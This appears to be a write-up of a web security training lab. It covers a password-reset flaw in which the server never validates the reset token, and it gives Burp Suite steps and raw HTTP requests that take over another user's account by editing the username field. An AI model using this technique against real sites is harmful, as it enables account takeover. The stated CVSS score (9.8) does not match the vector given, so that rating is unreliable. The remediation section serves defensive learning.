

# **Description**

The application implements a password reset functionality that allows users to recover access to their accounts via email. When a user requests a password reset, the system generates a unique token and sends it to the registered email address with a link containing the token as a URL query parameter. The user then clicks the link, which presents a form to set a new password.

However, the application suffers from a critical logic flaw in the password reset process. While the token is used to access the password reset page, the server does not validate or verify the token when the new password is actually submitted. The token is present in both the URL as a query parameter and in the request body as a hidden input field, but the server does not check that the token matches the user requesting the password change.

This vulnerability allows an attacker to request a password reset for their own account, obtain a valid token (or even discard it), and then use the password reset form to change any other user's password by simply modifying the `username` parameter in the request. The token is never validated against the username, making the password reset functionality completely insecure.

# **Steps to Exploit**

1. Navigate to the login page and click the "Forgot your password?" link.
2. Enter your own username (`wiener`) and request a password reset.
3. Click the "Email client" button to view the password reset email sent to your account.
4. Click the link in the email to access the password reset page.
5. In the browser, you will see the password reset form. Before submitting, ensure Burp Suite is intercepting traffic.
6. Enter a new password for your account (e.g., `newpassword`) and submit the form. Capture the `POST /forgot-password?temp-forgot-password-token` request in Burp Suite.
7. Send this request to Burp Repeater.
8. In Burp Repeater, test the token validation by deleting the value of the `temp-forgot-password-token` parameter from both the URL and the request body. Send the request and observe that the password reset still works. This confirms the token is not being validated.
9. In the browser, request another password reset for your account (`wiener`) and capture the new request in Burp Repeater.
10. Delete the token value from both the URL and request body.
11. Change the `username` parameter from `wiener` to `carlos`.
12. Set the `password` parameter to a new password of your choice (e.g., `hacked`).
13. Send the request. The server will accept it and change Carlos's password.
14. Log out of your account.
15. Log in as `carlos` using the new password you just set.
16. Navigate to "My account" to access Carlos's account page and solve the lab.

# **Proof of Concept**

**Step 1: Request a password reset for your own account:**
```
POST /forgot-password
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

username=wiener
```

**Step 2: Access the password reset link from your email:**
```
GET /forgot-password?temp-forgot-password-token=TOKEN_VALUE
Host: YOUR-LAB-ID.web-security-academy.net
```

**Step 3: Submit the password reset form (captured in Burp):**
```
POST /forgot-password?temp-forgot-password-token=TOKEN_VALUE
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

temp-forgot-password-token=TOKEN_VALUE&username=wiener&password=newpassword
```

**Step 4: Modified request to change Carlos's password:**
```
POST /forgot-password?temp-forgot-password-token=
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

temp-forgot-password-token=&username=carlos&password=hacked
```

**Step 5: Log in as Carlos:**
```
POST /login
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

username=carlos&password=hacked
```


# **Impact**

The broken password reset logic has severe security implications:

**Account Takeover:**
- An attacker can reset the password of any user, including administrators, without any interaction from the victim.
- No token validation means the attacker does not need to intercept or guess the reset token.

**Complete Account Compromise:**
- Once the password is changed, the legitimate user is locked out of their account.
- The attacker gains full access to the victim's account and all associated data.

**Privilege Escalation:**
- If the target account has administrative privileges, the attacker could gain administrative access to the entire application.
- This could lead to further compromise of the system and other users.

**Data Breach:**
- The attacker can view, modify, or exfiltrate sensitive personal and financial information.
- Order history, saved payment methods, and personal details become accessible.

**Reputational Damage:**
- A successful password reset attack undermines user trust in the platform.
- Could result in regulatory fines and legal action.

# **Mitigation / Remediation**

1. **Validate Reset Tokens on Submission:**
   - When the password reset form is submitted, the server must validate that the provided token matches the username in the request.
   - The token should be cryptographically secure and time-limited.

2. **Implement Token Binding:**
   - Bind the reset token to the specific user account when it is generated.
   - Only allow the token to be used for the account it was originally issued to.

3. **Use Secure Random Tokens:**
   - Generate tokens using a cryptographically secure random number generator.
   - Tokens should be sufficiently long and unpredictable.

4. **Implement Token Expiration:**
   - Set a short expiration time for reset tokens (e.g., 15-30 minutes).
   - Invalidate tokens after they have been used once.

5. **Server-Side Validation:**
   - Never rely on client-side validation for security-critical operations.
   - Implement comprehensive server-side validation for all authentication flows.

6. **Audit and Logging:**
   - Log all password reset attempts and successes.
   - Alert on unusual patterns of password reset activity.
![[img4.png]]
# **CVSS Justification**

| Metric | Value | Justification |
|---|---|---|
| Attack Vector | Network | The vulnerability is exploited remotely via standard HTTP requests |
| Attack Complexity | Low | The attack requires minimal technical skill; simply modifying request parameters |
| Privileges Required | None | The attacker only needs to know the victim's username |
| User Interaction | None | The exploit works without any interaction from the victim |
| Scope | Changed | The attacker gains complete control over the victim's account |
| Confidentiality Impact | High | All account data and personal information is exposed |
| Integrity Impact | High | The attacker can change account details and passwords |
| Availability Impact | High | The legitimate user is locked out of their account |

**CVSS Score: 9.8 (Critical)**

`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`

This critical score reflects the severe nature of the vulnerability, as it allows complete account takeover with minimal effort, requiring only knowledge of the victim's username, and affects the confidentiality, integrity, and availability of the user's account.